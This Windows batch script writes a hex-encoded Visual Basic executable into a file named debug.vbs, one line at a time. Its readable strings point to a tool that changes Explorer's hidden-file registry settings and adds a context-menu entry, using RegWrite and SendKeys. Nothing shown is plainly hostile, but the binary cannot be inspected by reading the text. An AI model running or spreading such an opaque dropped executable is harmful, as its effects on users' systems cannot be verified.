@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"FCB148738D6948736E9849739E10497373104973B0DB3B734E624873D568487324734673026248739A6248739A63487364B34873AF443B736FD83A73E6BB4973B89D3B7378B73A738A69487385E33B7309B448737C6746735B4E3B731D6648734E634873DC8E3B737F9D4973A1B24873CE624873CE634873026348733D5D4873"_>>debug.vbs
@echo +"3EDE397377954773A213497336B83A733C14497345B349734605477336B14873EA204873BAB44873350F4873FE473B73000000000000000007000800C0254000E8254000C72540000000000000000000FF2534104000FF2558104000FF2568104000FF2528104000FF2524104000FF2570104000FF2518104000FF257C104000"_>>debug.vbs
@echo +"FF252C104000FF2578104000FF2574104000FF2560104000FF2548104000FF255C104000FF251C104000FF2504104000FF259C104000FF2500104000FF25A8104000FF256C104000FF2530104000FF2550104000FF25A4104000FF25A0104000FF2544104000FF2514104000FF2598104000FF250C104000FF2540104000FF25"_>>debug.vbs
@echo +"88104000FF2510104000FF2564104000FF2594104000FF253C104000FF25AC104000FF2590104000FF2520104000FF258C104000FF2584104000FF2508104000FF2554104000FF2538104000FF254C104000FF25801040006828134000E8F0FFFFFF000000000000300000003800000000000000C1FA86F8133E8A44A786A590"_>>debug.vbs
@echo +"3599A9E500000000000001000000000000000000D7D3B3CCD0F2000000000000FFCC310000BC450CFB87DA604CAFE55E86E77A88C4F0E992301B50854AA53999CE40E29D5A3A4FAD339966CF11B70C00AA0060D393000000000000000000000000000000000000000000000000000000000000000000000000540000004F0000"_>>debug.vbs
@echo +"00000500466F726D31000D010500466F726D310003050000800A011901004200220123FFFFFFFF240500466F726D31002600270028002E003580340000092400003A0200001E0000004100FF0400000007000000D418400050000000BC450CFB87DA604CAFE55E86E77A88C40000000000000000000000000000000000000000"_>>debug.vbs
@echo +"100000000000000000000000000000000000000000000000AD00000000000000201240004C00000056423521F01F7662366368732E646C6C000000002A000000000000000000000000000A000408000000000000000000000C15400000F0300000FFFFFF080000000100000001000000E9000000D8124000D0124000E4114000"_>>debug.vbs
@echo +"780000008000000086000000870000000000000000000000000000000000000079696E63616E6700B9A4B3CC310000D7D3B3CCD0F2000000010000004817400000000000E81D4000FFFFFFFF000000009C1740000830400001000000301440000000000000000000000000003014400001000000F41740000000000034144000"_>>debug.vbs
@echo +"010000003C1440000000000038144000010000003C1440000100B70168006C0064144000E4324000000000007C571E00FFFF0000041840001418400040001F003400000024184000FFFFFFFF000000000000000068144000785B1E0034184000FFFFFFFF04154000000000003C144000B8134000C0114000C6114000CC114000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000FC144000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000816C2404"_>>debug.vbs
@echo +"33000000E937090000000000F40100004817400000000000301E400020264000E409000008304000D6104000003040002A005C0041004B003A005C0058005000F3532E956962555CBE8B6E7F0759FD4E5C00505B0B7A8F5E5C00505B0B7A8F5E2E00760062007000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000D012400001000000000000002C304000B41D4000FFFFFFFF000000001C304000E5444A3D4E3AF04E9D23F556C4B7C2AE0A000100010001009C17400000000000"_>>debug.vbs
@echo +"0000000000000000DC17400009040000040800000000000002000000B8134000FFFFFFFF08194000000000000000000000000000D417400002000000CC174000FFFF00008380010000000000B7664FC1B7664FC1466F726D31000000D7D3B3CCD0F20000F0E992301B50854AA53999CE40E29D5AFC90D323FBC0B548B76F6A08"_>>debug.vbs
@echo +"2973688ABC450CFB87DA604CAFE55E86E77A88C446A6A2EBB2EA0B4C962ACA051DDC4A1E3A4FAD339966CF11B70C00AA0060D393466F726D000000002E3DFBFCFAA06810A73808002B3371B5433A5C50726F6772616D2046696C65735C4D6963726F736F66742056697375616C2053747564696F5C564239385C5642362E4F4C"_>>debug.vbs
@echo +"42000000564200003C1840000000000006000000090000004C18400084184000D03240000000000000000000C0971A000D00000061647661706933322E646C6C000000000C0000005265674F70656E4B65794100B4184000C818400000000400D43240000000000000000000A1DC3240000BC07402FFE068D4184000B8601140"_>>debug.vbs
@echo +"00FFD0FFE00000000C00400000000000000000005F5F7662615661724D6F766500000000980000002A005C007300680065006C006C00650078005C0043006F006E0074006500780074004D0065006E007500480061006E0064006C006500720073005C007B00300030003000300030003000300030002D006B0069006E006700"_>>debug.vbs
@echo +"2D006B0069006E0067002D0032003200300030002D003000300030003000300030003000300030003000300030007D005C0046006F006C006400650072005C00000000008E00000048004B00430055005C0053006F006600740077006100720065005C004D006900630072006F0073006F00660074005C00570069006E006400"_>>debug.vbs
@echo +"6F00770073005C00430075007200720065006E007400560065007200730069006F006E005C004500780070006C006F007200650072005C0041006400760061006E006300650064005C00480069006400640065006E0000001A00000057007300630072006900700074002E005300680065006C006C0000005200650067005200"_>>debug.vbs
@echo +"6500610064000000530065006E0064004B00650079007300000000000200000031000000100000009096CF85FB7CDF7E9096CF858765F64E00000000564241362E444C4C000000005F5F766261456E64000000005F5F7662615661724C6174654D656D43616C6C4C64000000A000000048004B00430055005C0053006F006600"_>>debug.vbs
@echo +"740077006100720065005C004D006900630072006F0073006F00660074005C00570069006E0064006F00770073005C00430075007200720065006E007400560065007200730069006F006E005C004500780070006C006F007200650072005C0041006400760061006E006300650064005C00530068006F007700530075007000"_>>debug.vbs
@echo +"65007200480069006400640065006E00000000000200000030000000120000005200450047005F00440057004F00520044000000520065006700570072006900740065000000000002000000320000005800000048004B00430052005C0041006C006C00460069006C006500730079007300740065006D004F0062006A006500"_>>debug.vbs
@echo +"6300740073005C007300680065006C006C005C0053007500700065007200480069006400640065006E005C0000000000100000003E663A79FB7CDF7E9096CF858765F64E000000000C0000005200450047005F0053005A00000000003C00000048004B00430052005C0046006F006C006400650072005C007300680065006C00"_>>debug.vbs
@echo +"6C005C0053007500700065007200480069006400640065006E005C0000000000160000007B00460035007D002B007B004600310030007D00650000005F5F7662615661725365744F626A416464726566000000005F5F76626146726565566172000000005F5F7662614F626A566172005F5F7662614C6174654D656D43616C6C"_>>debug.vbs
@echo +"000000005F5F766261467265655661724C697374000000005F5F76626156617254737445710000005F5F76626146726565537472000000005F5F766261566172436F7079000000005F5F76626153657453797374656D4572726F72005F5F766261537472546F416E736900005F5F76626149345661720000E81D400000000000"_>>debug.vbs
@echo +"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048174000FFFFFFFF00000000781D4000000000000000000000000000FFFFFFFF000000008818400024184000E032400000000000B8134000FFFFFFFF000000000C00000000000000"_>>debug.vbs
@echo +"7C1D400000000000841D4000781D4000781D40000000000000000000000000004000000004000000CCCCCCCCCCCCCCCCE9E9E9E9CCCCCCCCCCCCCCCCCCCCCCCC558BEC83EC0C68D610400064A100000000506489250000000081ECD80000005356578965F4C745F8B81040008B45088BC883E101894DFC24FE508945088B10FF"_>>debug.vbs
@echo +"52048D45BC33DB50895DDC895DCC895DBC895DB8895DA8895D98895D88899D78FFFFFF899D68FFFFFF899D58FFFFFF899D38FFFFFF899D24FFFFFFFF15841040008D8D24FFFFFF8D55B851682819400052898524FFFFFFFF158C104000506800000080E804FAFFFF8BF0FF15201040008B8524FFFFFFBF030000008D9578FFFF"_>>debug.vbs
@echo +"FF8D4DBC89458089BD78FFFFFFFF15901040008D9568FFFFFF8D4DDC89B570FFFFFF89BD68FFFFFFFF15081040008D4DB8FF15AC1040008D4DDC8D9578FFFFFF5152895D80C78578FFFFFF02800000FF153C1040006685C00F84590600008B3564104000538D45A8BF08000000685C1A400050C74580C819400089BD78FFFFFF"_>>debug.vbs
@echo +"FFD68B9578FFFFFF8B857CFFFFFF83EC10C78560FFFFFF010000008BCCC78558FFFFFF028000006A0168781A400089118B55808941048B45848951088D559889410C8D4DA85152FF159410400083C420508D8558FFFFFF50FF153C1040008D4D988D55A851526A0289851CFFFFFFFF151010400083C40C66399D1CFFFFFFC745"_>>debug.vbs
@echo +"80F01A400089BD78FFFFFF0F84450200006A008D45A8685C1A400050C78560FFFFFF981B400089BD58FFFFFFBBA01B4000FFD68B9578FFFFFF8B857CFFFFFF83EC108BCC83EC1089118B55808941048B45848951088B9558FFFFFF89410C8B855CFFFFFF8BCC83EC1089118B9560FFFFFF8941048B8564FFFFFF8951088B953C"_>>debug.vbs
@echo +"FFFFFF89410C8BCC8BC76A0389018B8544FFFFFF68B41B40008951048959088B1D4010400089410C8D4DA851FFD350FF158810400083C43C8D4DA8FF150C1040006A008D55A8685C1A400052C74580C819400089BD78FFFFFFC78560FFFFFFCC1B400089BD58FFFFFFC78540FFFFFFA01B4000FFD68B8D78FFFFFF8B957CFFFF"_>>debug.vbs
@echo +"FF83EC108BC483EC1089088B4D808950048B55848948088B8D58FFFFFF89500C8B955CFFFFFF8BC483EC1089088B8D60FFFFFF8950048B9564FFFFFF8948088BCC89500C8BC78B953CFFFFFF89018B8540FFFFFF6A038951048B9544FFFFFF68B41B40008941088D45A85089510CFFD350FF158810400083C43C8D4DA8FF150C"_>>debug.vbs
@echo +"1040006A008D4DA8685C1A400051C74580D41B400089BD78FFFFFFC78560FFFFFF341C400089BD58FFFFFFFFD68B8578FFFFFF8B8D7CFFFFFF83EC108BD483EC1089028B4580894A048B4D848942088B8558FFFFFF894A0C8B8D5CFFFFFF8BD483EC1089028B8560FFFFFF894A048B8D64FFFFFF8942088BC7894A0C8BD48B8D"_>>debug.vbs
@echo +"44FFFFFF6A0389028B853CFFFFFF68B41B4000894204B84C1C4000894208894A0C8D55A852FFD350FF158810400083C43C8D4DA8FF150C104000C74580601C400089BD78FFFFFFC78560FFFFFF341C4000E9490200006A008D45A8685C1A400050C78560FFFFFFA01A400089BD58FFFFFFBBA01B4000FFD68B9578FFFFFF8B85"_>>debug.vbs
@echo +"7CFFFFFF83EC108BCC83EC1089118B55808941048B45848951088B9558FFFFFF89410C8B855CFFFFFF8BCC83EC1089118B9560FFFFFF8941048B8564FFFFFF8951088B953CFFFFFF89410C8BCCB8080000006A0389018B8544FFFFFF68B41B40008951048959088B1D4010400089410C8D4DA851FFD350FF158810400083C43C"_>>debug.vbs
@echo +"8D4DA8FF150C1040006A008D55A8685C1A400052C74580C819400089BD78FFFFFFC78560FFFFFFA01A400089BD58FFFFFFC78540FFFFFFA01B4000FFD68B8D78FFFFFF8B957CFFFFFF83EC108BC483EC1089088B4D808950048B55848948088B8D58FFFFFF89500C8B955CFFFFFF8BC483EC1089088B8D60FFFFFF8950048B95"_>>debug.vbs
@echo +"64FFFFFF8948088BCC89500CB8080000008B953CFFFFFF89018B8540FFFFFF6A038951048B9544FFFFFF68B41B40008941088D45A85089510CFFD350FF158810400083C43C8D4DA8FF150C1040006A008D4DA8685C1A400051C74580D41B400089BD78FFFFFFC78560FFFFFFA81A400089BD58FFFFFFFFD68B8578FFFFFF8B8D"_>>debug.vbs
@echo +"7CFFFFFF83EC108BD483EC1089028B4580894A048B4D848942088B8558FFFFFF894A0C8B8D5CFFFFFF8BD483EC1089028B8560FFFFFF894A048B8D64FFFFFF894208B808000000894A0C8BD48B8D44FFFFFF6A0389028B853CFFFFFF68B41B4000894204B84C1C4000894208894A0C8D55A852FFD350FF158810400083C43C8D"_>>debug.vbs
@echo +"4DA8FF150C104000C74580601C400089BD78FFFFFFC78560FFFFFFA81A40006A008D45A8685C1A40005089BD58FFFFFFC78540FFFFFF4C1C4000FFD68B9578FFFFFF8B857CFFFFFF83EC108BCC83EC1089118B55808941048B45848951088B9558FFFFFF89410C8B855CFFFFFF8BCC83EC1089118B9560FFFFFF8941048B8564"_>>debug.vbs
@echo +"FFFFFF8951088B953CFFFFFF89410C8BCCB8080000006A0389018B8540FFFFFF68B41B40008951048B9544FFFFFF8941088D45A85089510CFFD350FF158810400083C43C8D4DA8FF150C1040006A008D4DA8685C1A400051C74580A41C400089BD78FFFFFFFFD68B8578FFFFFF8B8D7CFFFFFF83EC108BD46A0168881A400089"_>>debug.vbs
@echo +"028B4580894A048B4D84894208894A0C8D55A852FFD350FF158810400083C41C8D4DA8FF150C1040008D45CC6A0050FF159810400033DBFF1514104000895DFC68FE254000EB218D4DB8FF15AC1040008D4D888D5598518D45A852506A03FF151010400083C410C38B350C1040008D4DDCFFD68D4DCCFFD68D4DBCFFD6C38B45"_>>debug.vbs
@echo +"08508B08FF51088B45FC8B4DEC5F5E64890D000000005B8BE55DC204009090909E9E9E9E4C260000FFFFFFFFFFFFFFFF002700000010000000000000000000000000000000000000000000000E270000182700002627000036270000462700005A2700006627000076270000842700009A270000AA270000BC270000CE270000"_>>debug.vbs
@echo +"D8270000E6270000FA2700000A280000182800002A280000382800004E28000058280000742800008A28000098280000CC020080AA280000BE280000C8280000DA280000EC280000FE280000640000800C2900001A2900002E290000402900005029000068290000802900008A290000942900009E290000A829000000000000"_>>debug.vbs
@echo +"4D535642564D36302E444C4C000000005F4349636F73000000005F61646A5F667074616E000000005F5F7662615661724D6F7665000000005F5F76626146726565566172000000005F5F766261467265655661724C697374000000005F5F766261456E64000000005F61646A5F666469765F6D36340000005F61646A5F667072"_>>debug.vbs
@echo +"656D310000005F5F76626153657453797374656D4572726F720000005F61646A5F666469765F6D33320000005F61646A5F666469765F6D313669000000005F61646A5F66646976725F6D3136690000005F434973696E000000005F5F76626143686B73746B0000004556454E545F53494E4B5F4164645265660000005F5F7662"_>>debug.vbs
@echo +"6156617254737445710000005F5F7662614F626A566172000000446C6C46756E6374696F6E43616C6C0000005F61646A5F66706174616E0000004556454E545F53494E4B5F52656C65617365000000005F4349737172740000004556454E545F53494E4B5F5175657279496E746572666163650000005F5F7662614578636570"_>>debug.vbs
@echo +"7448616E646C6572000000005F61646A5F667072656D000000005F61646A5F66646976725F6D3634000000005F5F7662614650457863657074696F6E000000005F43496C6F67000000005F61646A5F666469765F6D333269000000005F61646A5F66646976725F6D3332690000005F61646A5F66646976725F6D333200000000"_>>debug.vbs
@echo +"5F61646A5F666469765F720000005F5F7662614934566172000000005F5F7662614C6174654D656D43616C6C000000005F5F766261537472546F416E7369000000005F5F766261566172436F7079000000005F5F7662615661724C6174654D656D43616C6C4C640000005F5F7662615661725365744F626A4164647265660000"_>>debug.vbs
@echo +"00005F43496174616E0000005F616C6C6D756C0000005F434974616E000000005F4349657870000000005F5F766261467265655374720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000001A5CB445180000000000030003000000580000800E000000400000801000000028000080000000001A5CB44518000000000001000100000080000080000000001A5CB44518000000000001000100000098000080000000001A5CB445180000000000030031750000E000008032750000C800008033750000B0000080"_>>debug.vbs
@echo +"000000001A5CB445180000000000010004080000F8000000000000001A5CB44518000000000001000000000008010000000000001A5CB44518000000000001000000000018010000000000001A5CB44518000000000001000000000028010000000000001A5CB445180000000000010000000000380100005041000038020000"_>>debug.vbs
@echo +"B0040000000000008843000030000000B004000000000000B843000028010000B004000000000000E0440000E8020000B004000000000000C847000030010000B0040000000000000000000000000000380234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100"_>>debug.vbs
@echo +"0000010000000000000001000000000000000000000000000400000001000000000000000000000000000000440000000000560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000408B00498010000010053007400720069006E00"_>>debug.vbs
@echo +"6700460069006C00650049006E0066006F00000074010000010030003800300034003000340042003000000038001600010043006F006D00700061006E0079004E0061006D006500000000003E663A799096CF85FB7CDF7E9096CF858765F64E0000000030000C0001004C006500670061006C0043006F007000790072006900"_>>debug.vbs
@echo +"67006800740000000F5CD191E55D5C4FA45B0000280008000100500072006F0064007500630074004E0061006D00650000000000E55D0B7A310000002C000A000100460069006C006500560065007200730069006F006E000000000031002E00300030000000000030000A000100500072006F00640075006300740056006500"_>>debug.vbs
@echo +"7200730069006F006E00000031002E00300030000000000030001000010049006E007400650072006E0061006C004E0061006D0065000000790069006E00630061006E00670000004000180001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000790069006E00630061006E0067002E00"_>>debug.vbs
